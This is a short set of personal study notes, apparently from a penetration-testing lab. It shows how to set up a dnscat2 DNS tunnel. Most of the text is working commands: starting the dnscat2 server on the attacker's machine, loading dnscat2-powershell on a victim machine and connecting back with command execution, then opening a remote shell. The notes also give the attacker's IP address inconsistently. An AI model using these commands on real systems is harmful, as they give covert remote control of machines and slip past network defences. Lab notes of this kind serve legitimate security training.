installed in desktop but can see github again if need to install 

```
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```
10.10.14.58 -> our own ip address

On the victim machine we can get dns2-powershell.git
```shell-session
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

```
PS: Import-Module .\dnscat2.ps1
PS: Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```

Then we would have established a session then in dnscat2 we can see what we can do:
```
window -i 1
```
this creates a shell
